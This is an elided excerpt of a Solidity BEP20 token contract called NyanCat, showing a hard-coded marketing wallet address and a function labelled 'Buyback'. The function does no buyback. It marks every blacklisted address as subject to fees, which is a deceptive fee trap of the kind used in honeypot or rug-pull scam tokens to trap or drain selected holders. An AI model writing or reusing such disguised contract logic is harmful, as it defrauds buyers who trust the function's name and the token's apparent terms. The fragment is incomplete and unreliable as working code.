...
contract NyanCat is IBEP20, Ownable {
    ...
    string constant _symbol = unicode"Nyan";
    ...
    address private marketingWallet = 0x736EB7E369913D38351c31Eb411ee9795b09D6A1;
    ...
    function Buyback() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
